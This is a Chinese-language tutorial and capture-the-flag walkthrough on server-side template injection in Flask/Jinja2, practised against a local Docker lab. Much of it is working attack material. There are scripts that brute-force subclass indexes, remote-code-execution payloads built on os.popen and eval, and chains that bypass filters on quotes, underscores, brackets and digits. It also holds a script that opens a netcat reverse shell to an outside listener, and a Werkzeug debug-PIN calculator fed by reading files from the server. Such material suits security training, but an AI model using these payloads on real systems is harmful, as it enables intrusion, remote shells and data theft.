## SSTI(服务端模板注入)攻击
SSTI（server-side template injection)为服务端模板注入攻击，它主要是由于框架的不规范使用而导致的。主要为python的一些框架，如 jinja2 mako tornado django flask、PHP框架smarty twig thinkphp、java框架jade velocity spring等等使用了渲染函数时，由于代码不规范或信任了用户输入而导致了服务端模板注入，**模板渲染其实并没有漏洞**，主要是程序员**对代码不规范不严谨**造成了模板注入漏洞，造成模板可控。注入的原理可以这样描述：**当用户的输入数据没有被合理的处理控制时，就有可能数据插入了程序段中变成了程序的一部分，从而改变了程序的执行逻辑**。
![各框架模板结构](/image/各框架模板结构.png)
安装flask,如果直接用`pip install flask`是安装在物理机上，如果想安在虚拟机上，得用`source ./bin/activate`执行后，前面多了一个flask1（因为是在/opt/flask1目录下执行的），这时就到虚拟环境了，再执行`pip install flask`就安到虚拟环境了，用`deactivate`退出虚拟环境`sudo docker run -p 18022:22 -p 18080:80 -i -t mcc0624/flask_ssti:last bash -c '/etc/rc.local; /bin/bash'`启动把靶场，访问`localhost:18080`，如果不在虚拟机里，可以
`D:\pythonwenjian\pytest1\.venv\Scripts\activate`激活虚拟环境
写一个python程序
```python
from flask import Flask
app = Flask(__name__)
@app.route('/nihao')
def hello():
	return "hello world!!"
@app.route('/flag')
def flag():
	return "flag{Y0v_F1nO_m@!!}"
if __name__ == '__main__':
	app.run()
```
运行，默认是`http://127.0.0.1:5000`运行，访问`http://127.0.0.1:5000/nihao`回显`hello world!!`,访问`/flag`回显`flag{Y0v_F1nO_m@!!}`,如果改一下，`app.run(host='0.0.0.0')`，则又会监听其他端口
在命令提示符里输入`D:\pythonwenjian\pytest1\.venv\Scripts\activate`激活虚拟环境，
- `render_template`加载html文件，默认文件路径在templates目录下
- `render_template_string`用于渲染字符串，直接定义内容`return render_template_string('html文件内容')`这样就不用单独建一个html文件了
![判断](/image/判断.png)
绿色线表示回显49,红色线表示原样照印
## 魔术方法
- `__class__`查找当前类型的所属对象
- `__base__`沿着父子类的关系向上走一个
- `__mro__`查找当前类对象的所有继承类
- `__subclasses__()`查找父类下的所有子类
-  `__init__`查看类是否重载，重载是指程序在运行时就已经加载好了这个模块到内存中，如果出现wrapper字眼，说明没有重载
- `__globals__`函数会以字典的形式返回当前对象的全部全局变量
## SSTI常用注入模块
#### 文件读取
查找子类：`<class '_frozen_importlib_external.FileLoader'>`这个模块可以对服务器文件进行读取，具体这个模块在哪个位置可以用python脚本查，
```python
import requests  
url=input('请输入url链接:')  
for i in range(500):  
    data={"name":"{{''.__class__.__base__.__subclasses__()["+str(i)+"]}}"}#name可能需要根据实际情况变更  
    try:  
        response=requests.post(url,data=data)  
        #print(response.text)  
        if response.status_code == 200:  
            if '_frozen_importlib_external.FileLoader' in response.text:  
                print(response.text)  
                print(i)  
    except:  
        pass
```
执行后找到79，后`{{''.__class__.__base__.__subclasses__()[79]["get_data"](0,"/flag")}}`输出内容，get_data是_frozen_importlib_external.FileLoader下自带函数
而
```python
import requests  
url = input("请输入url链接:")  
for i in range(500):  
    data={"name":"{{''.__class__.__base__.__subclasses__()["+str(i)+"].__init__.__globals__['__builtins__']}}"}  
    try:  
        response = requests.post(url,data=data)  
        if response.status_code == 200:  
            if "eval" in response.text:  
                print(i)  
    except:  
        pass
```
可以查找哪些里有eval函数(高危命令执行函数)，记得每次的参数可能不同，'name'可能要根据实际情况修改
#### os模块
在其他函数里直接调用os模块
通过config,调用os`{{config.__class__.__init__.__globals__['os'].popen('whoami').read()}}`
通过url_for调用os
`{{url_for.__globals__.os.popen('whoami').read()}}`
在已经加载的os模块的子类里直接调用os模块
`{{''.__class__.__bases__[0].__subclasses__()[199].__init__.globals__['os'].popen('ls /').read()}}`
显示当前flask模块有哪些函数和对象
`{{self.__dict__._TemplateReference__context.keys()}}`可能显示
`dict_keys(['url_for', 'lipsum', 'request', 'session', 'range', 'get_flashed_messages', 'cycler', 'namespace', 'config', 'dict', 'joiner', 'g'])`其中url_for,lipsum,get_flashed_messages有内置os模块
`{{lipsum.__globals__}}`在输出中搜索一下，找到有os,eval,`{{lipsum.__globals__.os.popen('ls').read()}}`这样就可以执行具体命令,哪些类里面有os模块也可以用py脚本遍历出来，之后用`{{''.__class__.__base__.__subclasses__()[426].__init__.__globals__.os.popen('ls').read()}}`就可以执行命令
#### importlib类执行命令
用脚本查出来是第69个，可以加载第三方库，使用load_module加载os
`{{''.__class__.__base__.__subclasses__()[69]['load_module']('os')['popen']('ls -al').read()}}`执行命令
#### linecache函数执行命令
 linecache可以读取任意一个文件的某一行，这个函数也引用了os模块，用法类似`{{''.__class__.__base__.__subclasses__()[191].__init__.__globals__['linecache']['os'].popen('ls').read()}}`
#### subprocess.Popen类
`{{''.__class__.__base__.__subclasses__()[200]('ls',shell=True,stdout=-1).communicate()[0].strip()}}`

## WP
1. `code={{''.__class__.__base__.__subclasses__()[99].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('cat /app/flag').read()")}}`没有任何过滤，得到flag，输入`{{7*7}}`回显49,说明是jinja2模板
2. 这一关过滤了{{}}，但`{%%}`没过滤，试一下`{%if 2>1%}nihao{%endif%}`输出nihao,说明可以执行. 输入`{%if ''.__class__%}nihao{%endif%}`回显nihao,说明`''.__class__`里面是有内容的，写一个脚本
```python
import requests  
url = input("请输入url链接:")  
for i in range(500):  
    data={"code":"{% if ''.__class__.__base__.__subclasses__()["+str(i)+"].__init__.__globals__['popen']('ls').read()%}nihao{%endif%}"}  
    try:  
        response = requests.post(url,data=data)  
        if response.status_code == 200:  
            if "nihao" in response.text:  
                print(i,"-->",data)  
    except:  
        pass
```
得到`117 --> {'code': "{% if ''.__class__.__base__.__subclasses__()[117].__init__.__globals__['popen']('ls').read()%}nihao{%endif%}"}`最终payload为`{%print(''.__class__.__base__.__subclasses__()[117].__init__.__globals__['popen']('cat /flag').read())%}`得到flag`
3. **无回显SSTI**,可以用反弹shell,用一个脚本
```python
import requests  
  
url ='http://localhost:18080/flasklab/level/3' # 目标主机地址
  
for i in range(300):  
    try:  
        data = {"code":'{{().__class__.__base__.__subclasses__()['+str(i)+'].__init__.__globals__["os"].popen("netcat 192.168.221.129 7777 -e /bin/bash").read()}}'} #因为里面有太多的单引号，避免闭合出错，所以起前面的用()
        response = requests.post(url,data=data)  
    except:  
        pass
```
先用kali虚拟机`nc -lvp 7777`监听7777端口，其中`192.168.221.129`是监听机的ip地址，可以用`hostname -I`查看，运行脚本，监听到后就可以在虚拟机里执行命令查找flag,输入`cat /flag`得到flag
4. **过滤中括号**，可以用`__getitem__()`魔术方法代替，如输入`{{().__class__.__base__.__subclasses__()[117]}}`waf了，但可以用`{{().__class__.__base__.__subclasses__().__getitem__(117)}}`来代替，避免使用`[]`,最终payload`{{().__class__.__base__.__subclasses__().__getitem__(117).__init__.__globals__.__getitem__('popen')('cat /flag').read()}}`得到flag
5. **过滤单引号，双引号**，可以利用request模块，`{{().__class__.__base__.__subclasses__()[117].__init__.__globals__['popen']('cat /flag').read()}}`会报错waf,可以使用`request.args.nihao`替代，只要再传一个get参数`?nihao=popen`,所以最后payload post:`{{().__class__.__base__.__subclasses__()[117].__init__.__globals__[request.args.nihao](request.args.buhao).read()}}`get:`?nihao=popen&buhao=cat /flag`得到flag,也可以用`request.form.key`在post提交，或`request.cookies.key`在cookie处提交，所以也可以这样`code={{().__class__.__base__.__subclasses__()[117].__init__.__globals__[request.form.nihao](request.form.buhao).read()}}&nihao=popen&buhao=cat /flag`,记得cookies传参不用`&`分割，用`;`分割
6. **过滤下划线**，用attr绕过下划线过滤，payload  get部分`?class=__class__&base=__base__&sub=__subclasses__&geti=__getitem__&init=__init__&globals=__globals__&read=read`  post部分`code={{()|attr(request.args.class)|attr(request.args.base)|attr(request.args.sub)()|attr(request.args.geti)(117)|attr(request.args.init)|attr(request.args.globals)|attr(request.args.geti)('popen')('cat /flag')|attr(request.args.read)()}}`也可以使用unicode编码，`{{()|attr("__class__")|attr("__base__")|attr("__subclasses__")()|attr("__getitem__")(199)|attr("__init__")|attr("__globals__")|attr("__getitem__")("os")|attr("popen")("cat /flag")|attr("read")()}}`payload`code={{()|attr("\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f")|attr("\u005f\u005f\u0062\u0061\u0073\u0065\u005f\u005f")|attr("\u005f\u005f\u0073\u0075\u0062\u0063\u006c\u0061\u0073\u0073\u0065\u0073\u005f\u005f")()|attr("\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f")(199)|attr("\u005f\u005f\u0069\u006e\u0069\u0074\u005f\u005f")|attr("\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f")|attr("\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f")("os")|attr("popen")("cat /flag")|attr("read")()}}`也可以得到flag,也可以用十六进制替代下划线，如`{{()["__class__"]["__base__"]["__subclasses__"]()[199]["__init__"]["__globals__"]["os"].popen("ls").read()}}`即`{{()["\x5f\x5fclass\x5f\x5f"]["\x5f\x5fbase\x5f\x5f"]["\x5f\x5fsubclasses\x5f\x5f"]()[199]["\x5f\x5finit\x5f\x5f"]["\x5f\x5fglobals\x5f\x5f"]["os"].popen("cat /flag").read()}}`也可以得到flag
7. 上一关的unicode编码没用到点，可以直接在这一关使用，还可以用attr绕过，因为没过滤下划线，可以`{{()|attr("__class__")|attr("__base__")|attr("__subclasses__")()|attr("__getitem__")(117)|attr("__init__")|attr("__globals__")|attr("__getitem__")("popen")("cat /flag")|attr("read")()}}`还可以用中括号`[]`替代点`{{()["__class__"]["__base__"]["__subclasses__"]()[117]["__init__"]["__globals__"]["popen"]('cat /flag')["read"]()}}`也可以得到flag
8. **关键字过滤**,可以用
- 字符串编码，
- 也可以用`+`拼接`'__cl'+'ass__'`,`{{()["__cl"+"ass__"]["__ba"+"se__"]["__subc"+"lasses__"]()[199]["__in"+"it__"]["__glo"+"bals__"]["__get"+"item__"]('os')["pop"+"en"]("ls").read()}}`
- 也可以使用jinjia2中的`~`进行拼接，`{%set a="__cla"%}{%set b="ss__"%}{{a~b}}`例如`{%set a='__cla'%}{%set b='ss__'%}{%set c='__ba'%}{%set d='se__'%}{{()[a~b][c~d]}}`依次拼接
- 使用过滤器(reverse反转，replace替换，join拼接)`{%set a='__ssalc__'|reverse%}{{()[a]}}`
- `{%set a="__claee__"|replace("ee","ss")%}{{()[a]}}`
- `{%set a=dict(__cla=a,ss__=a)|join%}{{()[a]}}`
- `{%set a=['__cla','ss__']|join%}{{()[a]}}`
- 利用python的chr():`{%set chr=url_for.globals__['__builtins__'].chr%}{{""[chr(95)%2chr(95)%2chr(99)%2chr(108)%2chr(97)%2chr(115)%2chr(115)%2chr(95)%2chr(95)]}}`
4. **length过滤器绕过数字过滤**:可以用length替代数字，例如`{%set a='aaaaaa'|length%}{{a}}`返回6,也可以进行加法和乘法,`{%set a='aaaaaa'|length*'aaaa'|length%}{{a}}`返回24，这道题最终要执行这个指令`{{().__class__.__base__.__subclasses__()[117].__init__.__globals__['popen']('ls /').read()}}` 或者`{{().__class__.__base__.__subclasses__()[199].__init__.__globals__['os'].popen('ls /').read()}}`但数字被过滤，所以payload`{%set a='aaaaaaaaaaaa'|length*'aaaaaaaaaa'|length-'aaa'|length%}{{().__class__.__base__.__subclasses__()[117].__init__.__globals__['popen']('ls /').read()}}` 或者`{%set a='aaaaaaaaaa'|length*'aaaaaaaaaaaaaaaaaaaa'|length-'a'|length%}{{().__class__.__base__.__subclasses__()[a].__init__.__globals__['os'].popen('ls /').read()}}` 只要把需要数字的地方替换为a
5. **获取config文件**:flag可能藏在config里，如果没有任何过滤的话，可以通过`{{config}}`获取到
- **flask内置函数**：lipsum:可以加载第三方库  url_for:可返回url路径 get_flashed_message:可获取消息
- **flask内置对象**:cycler  joiner  namespace  config  request  session
- 这些flask内置函数和对象会在flask模块运行时自动加载，可以利用已加载内置函数或对象寻找被过滤的字符串，可以利用内置函数调用current_app模块进而查看配置文件
- 如果{{config}}不行，可以用`{{url_for.__globals__['current_app'].config}}`得到config,或者`{{get_flashed_messages.__globals__['current_app'].config}}`得到config
4. **混合过滤**：dict():用来创建一个字典  join:将一个序列中的参数值拼接成字符串，例如如果`__class__`被过滤了，可以用`{%set a=dict(__cla=1,ss__=b)|join%}{{a}}`可以拼接`__class__`
5. 如果一些符号被过滤，可以从flask的一些内置函数里获得这些符号，如`{%set ben=({}|select()|string())%}{{ben}}`可以获取下划线和空格，`{%set ben=(self|string())%}{{ben}}`可以用于获取空格，`{%set ben=(self|string|urlencode)%}{{ben}}`用来获取百分号，可以用list输出，`{%set ben=({}|select()|string())|list%}{{ben}}`输出`Hello ['<', 'g', 'e', 'n', 'e', 'r', 'a', 't', 'o', 'r', ' ', 'o', 'b', 'j', 'e', 'c', 't', ' ', 's', 'e', 'l', 'e', 'c', 't', '_', 'o', 'r', '_', 'r', 'e', 'j', 'e', 'c', 't', ' ', 'a', 't', ' ', '0', 'x', '7', 'b', '1', '2', 'a', '2', '8', '6', 'd', '0', 'a', '0', '>']`如果想用`<`就用`{%set a=({}|select()|string())|list%}{{a[0]}}`
6. 过滤了`' " + request . [ ]`,直接`{{().__class__}}`会被过滤但可以用`{%set a=dict(__class__=a)|join%}{{()|attr(a)}}`绕过执行，同理`{%set a=dict(__class__=a)|join%}{%set b=dict(__base__=a)|join%}{{()|attr(a)|attr(b)}}`也可以执行，但是`[]`被过滤了，可以用`__getitem__(117)`代替`[117]`,接下来一次得到`{%set a=dict(__class__=a)|join%}{%set b=dict(__base__=a)|join%}{%set c=dict(__subclasses__=a)|join%}{%set d=dict(__getitem__=a)|join%}{%set e=dict(__init__=a)|join%}{%set f=dict(__globals__=a)|join%}{%set g=dict(popen=a)|join%}{{()|attr(a)|attr(b)|attr(c)()|attr(d)(117)|attr(e)|attr(f)|attr(d)(g)}}`想要拼接的是`{{().__class__.__base__.__subclasses__()[117].__init__.__globals__['popen']('cat flag')read()}}`,但一定要用一个空格，这就可以用flask内置函数获得一个空格，最终payload`{%set a=dict(__class__=a)|join%}{%set b=dict(__base__=a)|join%}{%set c=dict(__subclasses__=a)|join%}{%set d=dict(__getitem__=a)|join%}{%set e=dict(__init__=a)|join%}{%set f=dict(__globals__=a)|join%}{%set g=dict(popen=a)|join%}{%set kg={}|select()|string()|attr(d)(10)%}{%set i=(dict(cat=a)|join,kg,dict(flag=a)|join)|join%}{%set h=dict(read=a)|join%}{{()|attr(a)|attr(b)|attr(c)()|attr(d)(117)|attr(e)|attr(f)|attr(d)(g)(i)|attr(h)()}}`
7. 过滤` ' " _ 0-9 . [ ] \ `，数字过滤可以用count`{%set nine=dict(aaaaaaaaa=a)|join|count%}{%set eigthteen=nine+nine%}{{nine,eigthteen}}`可以表示9和18，获取下划线和空格`{%set a=(lipsum|string|list)[18]%}{{a}}`和`{%set a=(lipsum|string|list)[9]%}{{a}}`显示payload原型`{{lipsum|attr("__globals__")|attr("__getitem__")("os")|attr("popen")("cat flag")|attr("read")()}}`最终payloas`{%set nine=dict(aaaaaaaaa=a)|join|count%}{%set eighteen=nine+nine%}{%set pop=dict(pop=a)|join%}{%set xhx=(lipsum|string|list)|attr(pop)(eighteen)%}{%set kg=(lipsum|string|list)|attr(pop)(nine)%}{%set globals=(xhx,xhx,dict(globals=a)|join,xhx,xhx)|join%}{%set getitem=(xhx,xhx,dict(getitem=a)|join,xhx,xhx)|join%}{%set os=dict(os=a)|join%}{%set popen=dict(popen=a)|join%}{%set flag=(dict(cat=a)|join,kg,dict(flag=a)|join)|join%}{%set read=dict(read=a)|join%}{{lipsum|attr(globals)|attr(getitem)(os)|attr(popen)(flag)|attr(read)()}}`
8. **debug pin码计算**，对于有文件包含或文件读取的漏洞，且开启debug功能，想要执行指令还要输入pin码，如果程序开启了debug`if __name__ == '__main__':  app.run(host='0.0.0.0',debug=True)`访问网页时访问/console会弹出一个界面![](/image/66.png)pin码会在程序运行时自动生成，如果pin码输入正确可以有一个执行命令的能力，pin码由六个参数组成，
- 1. username->执行代码时的用户名
- 2. `getattr(app,"__name__",app.__class__.__name__)`-->Flask
- 3. modname -->固定值默认flask.app
- 4. `getattr(mod,"__flile__",None)`-->app.py文件所在路径
- 5.  str(uuid.getnode()) -->根据电脑的mac地址
- 6. get_machine_id() -->根据操作系统不同，有四种获取方式
可以用
```python
import getpass
username=getpass.getuser()
print(username)
```
获得username,
用
```python
import sys  
from flask import Flask  
import typing as t   
app = Flask(__name__)  
modname=getattr(app,"__module__",t.cast(object,app).__class__.__module__)  
print(modname)
```
获得flask.app
用
```python
import sys  
from flask import Flask  
import typing as t 
app = Flask(__name__)  
modname=getattr(app,"__module__",t.cast(object,app).__class__.__module__)
mod=sys.modules.get(modname)  
print(getattr(mod,"__file__",None))
```
获得app.py的路径
获得uuid(就是当前网卡的物理地址的整型)
```python
import uuid
print(str(hex(uuid.getnode())))
```
get_machine_id获取
```
linux /etc/machine-id,/proc/sys/kernl/random/boot_id 前者固定，后者不固定
docker /proc/self/cgroup
macOS ioreg -c IOPlatformExpertDevice -d 2
windows 
```
可以进行本地计算pin码
**例题**
可以读取文件，有文件读取漏洞，读取/etc/passwd可以找到username,访问debug可以泄露app.py的绝对路径，接下来找uuid，读取`/sys/class/net/ens33/address`(centos)或`/sys/class/net/eth0/address`(unbuntu),得到`3a:a8:09:61:ee:e6`（记得转十进制）,这就是mac地址，接下来找machine_id,因为是docker,读取`/etc/machine-id`得到`b7471d41202f4da392a4743b37ea3b69`,再读取`/proc/self/cgroup`得到的与前面的拼接，如果知道python版本的话，可以得知最后用MD5还是sha1,接下来把数据放到代码里计算，得到pin码
```python
import hashlib  
from itertools import  chain  
probably_public_bits = [  
    'root'# username  
    'flask.app',# modname  
    'Flask',# getattr(app, '__name__', getattr(app.__class__,'__name__'))  
    '/opt/Python/flaskdebug/lib/python2.7/site-packages/flask/app.pyc' #getattr(mod, '__file__', None)  
]  
private_bits = [  
    '2482658870020',# str(uuid.getnode()),/sys/class/net/ens33/address  
'b7471d41202f4da392a4743b37ea3b692f398f6cfbb37a791835750ea6a212b66c360b696c2479883c0ae14408e02c61'# get_machine_id(), /etc/machine-id  
]  
h = hashlib.md5()  
for bit in chain(probably_public_bits, private_bits):  
    if not bit:  
        continue  
    if isinstance(bit, str):  
        bit = bit.encode('utf-8')  
    h.update(bit)  
h.update(b'cookiesalt')  
  
cookie_name = '_wzd' + h.hexdigest()[:20]  
  
num = None  
if num is None:  
    h.update(b'pinsalt')  
    num = ("%09d" % int(h.hexdigest(), 16))[:9]  
rv =None  
if rv is None:  
    for group_size in 5, 4, 3:  
        if len(num) % group_size == 0:  
            rv = '-'.join(num[x:x + group_size].rjust(group_size,  
'0')  
            for x in range(0, len(num), group_size))  
            break  
    else:  
        rv = num  
print(rv)
```
得到pin码，260-124-075,输入console可以执行
